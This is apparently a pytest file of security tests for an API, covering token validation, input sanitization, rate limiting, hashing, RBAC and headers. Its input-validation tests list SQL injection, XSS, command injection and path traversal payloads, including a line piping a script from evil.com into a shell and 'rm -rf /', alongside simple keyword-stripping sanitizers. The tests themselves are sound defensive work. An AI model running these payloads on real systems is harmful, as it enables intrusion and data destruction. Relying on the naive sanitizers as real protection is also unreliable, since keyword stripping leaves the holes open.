"""Security tests for all API endpoints."""

import pytest
import json
from unittest.mock import Mock, AsyncMock, patch
import jwt
from datetime import datetime, timedelta
import base64

# Add project root to path
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))


class TestAuthenticationSecurity:
    """Test authentication security measures."""
    
    def test_jwt_token_validation(self):
        """Test JWT token validation."""
        secret = "test_secret_key_123"
        
        # Valid token
        valid_payload = {
            "user_id": "123",
            "exp": datetime.utcnow() + timedelta(hours=1),
            "iat": datetime.utcnow()
        }
        valid_token = jwt.encode(valid_payload, secret, algorithm="HS256")
        
        # Expired token
        expired_payload = {
            "user_id": "123",
            "exp": datetime.utcnow() - timedelta(hours=1),
            "iat": datetime.utcnow() - timedelta(hours=2)
        }
        expired_token = jwt.encode(expired_payload, secret, algorithm="HS256")
        
        # Invalid signature token
        invalid_token = jwt.encode(valid_payload, "wrong_secret", algorithm="HS256")
        
        # Test valid token
        try:
            decoded = jwt.decode(valid_token, secret, algorithms=["HS256"])
            assert decoded["user_id"] == "123"
        except jwt.InvalidTokenError:
            pytest.fail("Valid token should not raise error")
        
        # Test expired token
        with pytest.raises(jwt.ExpiredSignatureError):
            jwt.decode(expired_token, secret, algorithms=["HS256"])
        
        # Test invalid signature
        with pytest.raises(jwt.InvalidSignatureError):
            jwt.decode(invalid_token, secret, algorithms=["HS256"])
    
    def test_api_key_validation(self):
        """Test API key validation."""
        valid_api_key = "valid_api_key_123456789"
        invalid_api_key = "invalid_key"
        
        # Mock validation function
        def validate_api_key(key: str) -> bool:
            return key == valid_api_key
        
        assert validate_api_key(valid_api_key) is True
        assert validate_api_key(invalid_api_key) is False
        assert validate_api_key("") is False
        assert validate_api_key(None) is False
    
    def test_oauth2_token_validation(self):
        """Test OAuth2 token validation."""
        # Mock OAuth2 token validation
        class OAuth2Validator:
            def __init__(self):
                self.valid_tokens = {"valid_token_123": {"user": "test_user"}}
            
            def validate_token(self, token: str) -> dict:
                if not token:
                    raise ValueError("Token required")
                if token not in self.valid_tokens:
                    raise ValueError("Invalid token")
                return self.valid_tokens[token]
        
        validator = OAuth2Validator()
        
        # Test valid token
        result = validator.validate_token("valid_token_123")
        assert result["user"] == "test_user"
        
        # Test invalid token
        with pytest.raises(ValueError, match="Invalid token"):
            validator.validate_token("invalid_token")
        
        # Test missing token
        with pytest.raises(ValueError, match="Token required"):
            validator.validate_token("")


class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords --",
            "1; DELETE FROM configurations WHERE 1=1",
            "' OR 1=1 --"
        ]
        
        def sanitize_sql_input(input_str: str) -> str:
            """Basic SQL input sanitization."""
            if not input_str:
                return ""
            
            # Remove SQL keywords and special characters
            dangerous_patterns = [
                "DROP", "DELETE", "INSERT", "UPDATE", "SELECT",
                "UNION", "WHERE", "--", ";", "'"
            ]
            
            sanitized = input_str
            for pattern in dangerous_patterns:
                sanitized = sanitized.replace(pattern, "")
                sanitized = sanitized.replace(pattern.lower(), "")
            
            return sanitized.strip()
        
        for malicious_input in malicious_inputs:
            sanitized = sanitize_sql_input(malicious_input)
            # Ensure dangerous SQL keywords are removed
            assert "DROP" not in sanitized.upper()
            assert "DELETE" not in sanitized.upper()
            assert "UNION" not in sanitized.upper()
            assert "--" not in sanitized
            assert ";" not in sanitized
    
    def test_xss_prevention(self):
        """Test XSS attack prevention."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>"
        ]
        
        def sanitize_html_input(input_str: str) -> str:
            """Basic HTML/XSS sanitization."""
            if not input_str:
                return ""
            
            # Remove HTML tags and JavaScript
            import re
            
            # Remove script tags and content
            sanitized = re.sub(r'<script[^>]*>.*?</script>', '', input_str, flags=re.IGNORECASE | re.DOTALL)
            # Remove all HTML tags
            sanitized = re.sub(r'<[^>]+>', '', sanitized)
            # Remove javascript: protocol
            sanitized = re.sub(r'javascript:', '', sanitized, flags=re.IGNORECASE)
            # Remove event handlers
            sanitized = re.sub(r'on\w+\s*=', '', sanitized, flags=re.IGNORECASE)
            
            return sanitized.strip()
        
        for xss_payload in xss_payloads:
            sanitized = sanitize_html_input(xss_payload)
            # Ensure no script tags or JavaScript remains
            assert "<script" not in sanitized.lower()
            assert "javascript:" not in sanitized.lower()
            assert "onerror" not in sanitized.lower()
            assert "onload" not in sanitized.lower()
    
    def test_command_injection_prevention(self):
        """Test command injection prevention."""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`rm -rf /`",
            "$(curl evil.com/malware.sh | sh)",
            "../../../etc/passwd"
        ]
        
        def sanitize_command_input(input_str: str) -> str:
            """Basic command injection prevention."""
            if not input_str:
                return ""
            
            # Remove shell metacharacters
            dangerous_chars = [";", "|", "&", "`", "$", "(", ")", "<", ">", "\\n", "\\r"]
            
            sanitized = input_str
            for char in dangerous_chars:
                sanitized = sanitized.replace(char, "")
            
            # Remove path traversal attempts
            sanitized = sanitized.replace("../", "")
            sanitized = sanitized.replace("..\\", "")
            
            return sanitized.strip()
        
        for payload in command_payloads:
            sanitized = sanitize_command_input(payload)
            # Ensure no shell metacharacters remain
            assert ";" not in sanitized
            assert "|" not in sanitized
            assert "&" not in sanitized
            assert "`" not in sanitized
            assert "$(" not in sanitized
            assert "../" not in sanitized
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention."""
        path_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..;/etc/passwd"
        ]
        
        def sanitize_file_path(input_path: str) -> str:
            """Basic path traversal prevention."""
            if not input_path:
                return ""
            
            import os
            import urllib.parse
            
            # URL decode first
            decoded = urllib.parse.unquote(input_path)
            
            # Remove path traversal patterns
            sanitized = decoded.replace("../", "")
            sanitized = sanitized.replace("..\\", "")
            sanitized = sanitized.replace("..;", "")
            sanitized = sanitized.replace("....", "")
            
            # Normalize path
            sanitized = os.path.normpath(sanitized)
            
            # Ensure path doesn't start with / or contain :
            if sanitized.startswith("/") or ":" in sanitized:
                sanitized = os.path.basename(sanitized)
            
            return sanitized
        
        for payload in path_payloads:
            sanitized = sanitize_file_path(payload)
            # Ensure no path traversal patterns remain
            assert "../" not in sanitized
            assert "..\\" not in sanitized
            assert not sanitized.startswith("/etc")
            assert not sanitized.startswith("\\windows")


class TestRateLimiting:
    """Test rate limiting and DDoS protection."""
    
    def test_rate_limit_per_user(self):
        """Test per-user rate limiting."""
        class RateLimiter:
            def __init__(self, max_requests: int, window_seconds: int):
                self.max_requests = max_requests
                self.window_seconds = window_seconds
                self.requests = {}
            
            def is_allowed(self, user_id: str) -> bool:
                now = datetime.utcnow()
                
                if user_id not in self.requests:
                    self.requests[user_id] = []
                
                # Remove old requests outside window
                cutoff = now - timedelta(seconds=self.window_seconds)
                self.requests[user_id] = [
                    req_time for req_time in self.requests[user_id]
                    if req_time > cutoff
                ]
                
                # Check if limit exceeded
                if len(self.requests[user_id]) >= self.max_requests:
                    return False
                
                # Add current request
                self.requests[user_id].append(now)
                return True
        
        limiter = RateLimiter(max_requests=5, window_seconds=60)
        user_id = "test_user"
        
        # First 5 requests should be allowed
        for i in range(5):
            assert limiter.is_allowed(user_id) is True
        
        # 6th request should be blocked
        assert limiter.is_allowed(user_id) is False
    
    def test_rate_limit_per_ip(self):
        """Test per-IP rate limiting."""
        class IPRateLimiter:
            def __init__(self):
                self.blocked_ips = set()
                self.request_counts = {}
            
            def check_ip(self, ip: str) -> bool:
                if ip in self.blocked_ips:
                    return False
                
                if ip not in self.request_counts:
                    self.request_counts[ip] = 0
                
                self.request_counts[ip] += 1
                
                # Block after 100 requests
                if self.request_counts[ip] > 100:
                    self.blocked_ips.add(ip)
                    return False
                
                return True
        
        limiter = IPRateLimiter()
        
        # Normal usage
        for i in range(100):
            assert limiter.check_ip("192.168.1.1") is True
        
        # Should be blocked after 100 requests
        assert limiter.check_ip("192.168.1.1") is False
        
        # Different IP should work
        assert limiter.check_ip("192.168.1.2") is True


class TestDataProtection:
    """Test data protection and encryption."""
    
    def test_password_encryption(self):
        """Test password encryption and hashing."""
        import hashlib
        import secrets
        
        def hash_password(password: str, salt: str = None) -> tuple:
            """Hash password with salt."""
            if salt is None:
                salt = secrets.token_hex(16)
            
            # Use PBKDF2 for password hashing
            key = hashlib.pbkdf2_hmac(
                'sha256',
                password.encode('utf-8'),
                salt.encode('utf-8'),
                100000  # iterations
            )
            
            return key.hex(), salt
        
        def verify_password(password: str, hashed: str, salt: str) -> bool:
            """Verify password against hash."""
            new_hash, _ = hash_password(password, salt)
            return new_hash == hashed
        
        # Test password hashing
        password = "SecurePassword123!"
        hashed, salt = hash_password(password)
        
        # Hash should be different from original
        assert hashed != password
        
        # Verification should work
        assert verify_password(password, hashed, salt) is True
        assert verify_password("WrongPassword", hashed, salt) is False
        
        # Same password with different salt should produce different hash
        hashed2, salt2 = hash_password(password)
        assert hashed != hashed2
        assert salt != salt2
    
    def test_sensitive_data_masking(self):
        """Test masking of sensitive data in logs/responses."""
        def mask_sensitive_data(data: dict) -> dict:
            """Mask sensitive fields in data."""
            sensitive_fields = [
                "password", "api_key", "secret", "token",
                "ssn", "credit_card", "private_key"
            ]
            
            masked = data.copy()
            
            for key, value in masked.items():
                if any(field in key.lower() for field in sensitive_fields):
                    if isinstance(value, str):
                        # Keep first 4 chars and mask the rest
                        if len(value) > 4:
                            masked[key] = value[:4] + "*" * (len(value) - 4)
                        else:
                            masked[key] = "*" * len(value)
                elif isinstance(value, dict):
                    masked[key] = mask_sensitive_data(value)
            
            return masked
        
        # Test data with sensitive fields
        test_data = {
            "username": "john_doe",
            "password": "SuperSecret123",
            "api_key": "sk_test_123456789",
            "email": "john@example.com",
            "nested": {
                "secret_token": "token_abc_xyz",
                "public_key": "pk_123"
            }
        }
        
        masked = mask_sensitive_data(test_data)
        
        # Check sensitive data is masked
        assert masked["password"] == "Supe***********"
        assert masked["api_key"] == "sk_t*************"
        assert masked["nested"]["secret_token"] == "toke*********"
        
        # Non-sensitive data should remain unchanged
        assert masked["username"] == "john_doe"
        assert masked["email"] == "john@example.com"
    
    def test_encryption_at_rest(self):
        """Test data encryption at rest."""
        from cryptography.fernet import Fernet
        
        # Generate encryption key
        key = Fernet.generate_key()
        cipher = Fernet(key)
        
        # Test data
        sensitive_data = {
            "organization": "Acme Corp",
            "credentials": {
                "username": "admin",
                "password": "secret123"
            }
        }
        
        # Encrypt data
        data_json = json.dumps(sensitive_data)
        encrypted = cipher.encrypt(data_json.encode())
        
        # Encrypted data should be different
        assert encrypted != data_json.encode()
        
        # Decrypt and verify
        decrypted = cipher.decrypt(encrypted)
        decrypted_data = json.loads(decrypted.decode())
        
        assert decrypted_data == sensitive_data


class TestAccessControl:
    """Test access control and authorization."""
    
    def test_rbac_permissions(self):
        """Test Role-Based Access Control."""
        class RBAC:
            def __init__(self):
                self.roles = {
                    "admin": ["read", "write", "delete", "admin"],
                    "user": ["read", "write"],
                    "viewer": ["read"]
                }
                self.user_roles = {}
            
            def assign_role(self, user_id: str, role: str):
                """Assign role to user."""
                if role not in self.roles:
                    raise ValueError(f"Invalid role: {role}")
                self.user_roles[user_id] = role
            
            def has_permission(self, user_id: str, permission: str) -> bool:
                """Check if user has permission."""
                if user_id not in self.user_roles:
                    return False
                
                role = self.user_roles[user_id]
                return permission in self.roles.get(role, [])
        
        rbac = RBAC()
        
        # Assign roles
        rbac.assign_role("admin_user", "admin")
        rbac.assign_role("normal_user", "user")
        rbac.assign_role("read_only", "viewer")
        
        # Test admin permissions
        assert rbac.has_permission("admin_user", "read") is True
        assert rbac.has_permission("admin_user", "write") is True
        assert rbac.has_permission("admin_user", "delete") is True
        assert rbac.has_permission("admin_user", "admin") is True
        
        # Test user permissions
        assert rbac.has_permission("normal_user", "read") is True
        assert rbac.has_permission("normal_user", "write") is True
        assert rbac.has_permission("normal_user", "delete") is False
        assert rbac.has_permission("normal_user", "admin") is False
        
        # Test viewer permissions
        assert rbac.has_permission("read_only", "read") is True
        assert rbac.has_permission("read_only", "write") is False
        assert rbac.has_permission("read_only", "delete") is False
        
        # Test unknown user
        assert rbac.has_permission("unknown_user", "read") is False
    
    def test_organization_isolation(self):
        """Test data isolation between organizations."""
        class DataAccessControl:
            def __init__(self):
                self.data = {
                    "org1": {"servers": ["server1", "server2"]},
                    "org2": {"servers": ["server3", "server4"]}
                }
            
            def get_data(self, user_org: str, requested_org: str) -> dict:
                """Get data with organization isolation."""
                # Users can only access their own organization's data
                if user_org != requested_org:
                    raise PermissionError(f"Access denied to {requested_org}")
                
                return self.data.get(requested_org, {})
        
        dac = DataAccessControl()
        
        # Users can access their own org
        data = dac.get_data("org1", "org1")
        assert "server1" in data["servers"]
        
        # Users cannot access other orgs
        with pytest.raises(PermissionError):
            dac.get_data("org1", "org2")


class TestAuditLogging:
    """Test audit logging for security events."""
    
    def test_security_event_logging(self):
        """Test logging of security-relevant events."""
        class SecurityLogger:
            def __init__(self):
                self.events = []
            
            def log_event(self, event_type: str, user: str, details: dict):
                """Log security event."""
                event = {
                    "timestamp": datetime.utcnow().isoformat(),
                    "type": event_type,
                    "user": user,
                    "details": details
                }
                self.events.append(event)
                return event
            
            def get_events(self, event_type: str = None) -> list:
                """Get logged events."""
                if event_type:
                    return [e for e in self.events if e["type"] == event_type]
                return self.events
        
        logger = SecurityLogger()
        
        # Log various security events
        logger.log_event("login_success", "user1", {"ip": "192.168.1.1"})
        logger.log_event("login_failure", "user2", {"ip": "192.168.1.2", "reason": "invalid_password"})
        logger.log_event("permission_denied", "user1", {"resource": "/admin", "action": "delete"})
        logger.log_event("data_export", "user3", {"records": 1000, "destination": "csv"})
        
        # Verify events are logged
        assert len(logger.events) == 4
        
        # Check specific event types
        login_failures = logger.get_events("login_failure")
        assert len(login_failures) == 1
        assert login_failures[0]["details"]["reason"] == "invalid_password"
        
        # Check permission denied events
        perm_denied = logger.get_events("permission_denied")
        assert len(perm_denied) == 1
        assert perm_denied[0]["details"]["resource"] == "/admin"


class TestSecurityHeaders:
    """Test security headers for HTTP responses."""
    
    def test_required_security_headers(self):
        """Test that required security headers are present."""
        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin"
        }
        
        # Mock response headers
        response_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin"
        }
        
        # Verify all required headers are present
        for header, expected_value in required_headers.items():
            assert header in response_headers
            assert response_headers[header] == expected_value
    
    def test_cors_configuration(self):
        """Test CORS configuration."""
        class CORSConfig:
            def __init__(self):
                self.allowed_origins = [
                    "https://app.example.com",
                    "https://admin.example.com"
                ]
                self.allowed_methods = ["GET", "POST", "PUT", "DELETE"]
                self.allowed_headers = ["Content-Type", "Authorization"]
            
            def is_origin_allowed(self, origin: str) -> bool:
                """Check if origin is allowed."""
                return origin in self.allowed_origins
            
            def is_method_allowed(self, method: str) -> bool:
                """Check if method is allowed."""
                return method in self.allowed_methods
        
        cors = CORSConfig()
        
        # Test allowed origins
        assert cors.is_origin_allowed("https://app.example.com") is True
        assert cors.is_origin_allowed("https://evil.com") is False
        
        # Test allowed methods
        assert cors.is_method_allowed("GET") is True
        assert cors.is_method_allowed("TRACE") is False


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])